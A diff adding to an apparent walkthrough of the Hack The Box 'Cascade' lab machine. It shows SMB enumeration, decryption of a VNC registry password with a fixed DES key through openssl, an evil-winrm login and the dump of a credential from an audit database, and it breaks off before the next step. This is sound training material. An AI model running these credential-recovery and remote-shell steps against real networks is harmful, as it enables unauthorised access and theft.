@@ -234,6 +234,137 @@
         print$                                            	READ ONLY	Printer Drivers
         SYSVOL                                            	READ ONLY	Logon server share 
 
-// 
+// After some digging in the directories that we have read permissions on
 
-smbmap -u r.thompson -p rY4n5eva -H cascade.local -r Data/IT
+// I have found file called 'VNC Install.reg' in Data/IT/Temp/s.smith/
+
+    $ cat cascade.local-Data_IT_Temp_s.smith_VNC\ Install.reg 
+    
+    ...
+    "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+    ...
+    
+// We can see there encrypted password. i tried to decrypt it with some techniques but it didnt work
+
+// So i searched for VNC encrypted password crack and the only thing that work is from [here](https://github.com/frizb/PasswordDecrypts)
+
+    $ echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
+    00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
+    00000008
+
+// Greate!, we got s.smith password
+
+    s.smith : sT333ve2
+
+// We can use now [Evil-winrm](https://github.com/Hackplayers/evil-winrm) to gain shell as s.smith
+
+    $ evil-winrm -i cascade.local -u s.smith -p sT333ve2
+------
+
+    *Evil-WinRM* PS C:\Users\s.smith\Documents> whoami
+    cascade\s.smith
+
+// And we got user flag !
+
+    *Evil-WinRM* PS C:\Users\s.smith\Desktop>type user.txt
+    055255...................
+
+
+### ----Privilleges Escalation----
+
+
+// Continue with user s.smith i decided to see if we have more/another directories we can read
+
+    $ smbmap -H 10.10.10.182 -u s.smith -p sT333ve2
+-----
+
+    [+] IP: 10.10.10.182:445	Name: cascade.local                                     
+            Disk                                                  	Permissions	Comment
+        ----                                                  	-----------	-------
+        ADMIN$                                            	NO ACCESS	Remote Admin
+        Audit$                                            	READ ONLY	
+        C$                                                	NO ACCESS	Default share
+        Data                                              	READ ONLY	
+        IPC$                                              	NO ACCESS	Remote IPC
+        NETLOGON                                          	READ ONLY	Logon server share 
+        print$                                            	READ ONLY	Printer Drivers
+        SYSVOL                                            	READ ONLY	Logon server share 
+
+// Indeed we have another directory called 'Audit$' that we have read permissions on, Lets check him out
+
+    $ smbmap -H 10.10.10.182 -u s.smith -p sT333ve2 -r Audit$
+-----
+
+    [+] IP: 10.10.10.182:445	Name: cascade.local                                     
+            Disk                                                  	Permissions	Comment
+        ----                                                  	-----------	-------
+        Audit$                                            	READ ONLY	
+        .\Audit$\*
+        dr--r--r--                0 Wed Jan 29 13:01:26 2020	.
+        dr--r--r--                0 Wed Jan 29 13:01:26 2020	..
+        fr--r--r--            13312 Tue Jan 28 16:47:08 2020	CascAudit.exe
+        fr--r--r--            12288 Wed Jan 29 13:01:26 2020	CascCrypto.dll
+        dr--r--r--                0 Tue Jan 28 16:43:18 2020	DB
+        fr--r--r--               45 Tue Jan 28 18:29:47 2020	RunAudit.bat
+        fr--r--r--           363520 Tue Jan 28 15:42:18 2020	System.Data.SQLite.dll
+        fr--r--r--           186880 Tue Jan 28 15:42:18 2020	System.Data.SQLite.EF6.dll
+        dr--r--r--                0 Tue Jan 28 15:42:18 2020	x64
+        dr--r--r--                0 Tue Jan 28 15:42:18 2020	x86
+    
+// We notice that there is exetubale file called 'CascAudit.exe' and 'CascCrypto.dll' library, We will back for that later
+
+// Next i search in DB folder
+
+    $ smbmap -H 10.10.10.182 -u s.smith -p sT333ve2 -r Audit$/DB
+-----
+
+    [+] IP: 10.10.10.182:445	Name: cascade.local                                     
+            Disk                                                  	Permissions	Comment
+        ----                                                  	-----------	-------
+        Audit$                                            	READ ONLY	
+        .\Audit$DB\*
+        dr--r--r--                0 Tue Jan 28 16:43:18 2020	.
+        dr--r--r--                0 Tue Jan 28 16:43:18 2020	..
+        fr--r--r--            24576 Tue Jan 28 16:43:18 2020	Audit.db
+-----
+
+// We can see there file called Audit.DB lets download him
+
+    $ smbmap -H 10.10.10.182 -u s.smith -p sT333ve2 --download Audit$/DB/Audit.DB
+
+    [+] Starting download: Audit$\DB\Audit.DB (24576 bytes)
+    [+] File output to: /home/r4r3/Desktop/backup_20_9/GitHub/HTB/Machines/Windows/Medium/Cascade/10.10.10.182-Audit_DB_Audit.DB
+
+------
+
+// And open him with sqlite3
+
+    $ sqlite3 10.10.10.182-Audit_DB_Audit.DB 
+-----
+
+    sqlite> .tables
+    DeletedUserAudit  Ldap              Misc      
+
+
+    sqlite> .dump Ldap
+    PRAGMA foreign_keys=OFF;
+    BEGIN TRANSACTION;
+    CREATE TABLE IF NOT EXISTS "Ldap" (
+        "Id"	INTEGER PRIMARY KEY AUTOINCREMENT,
+        "uname"	TEXT,
+        "pwd"	TEXT,
+        "domain"	TEXT
+    );
+    INSERT INTO Ldap VALUES(1,'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw==','cascade.local');
+    COMMIT;
+    sqlite> 
+
+// When we dump Ldap content, we can see there user's ArkSvc hashed string(seems to be password)
+
+// Searching many ways to decrypt that string didnt end with any results, so i think it  
+
+// It somehow kind connected with the exetubale file we find earlier in Audit$
+
+
+
+
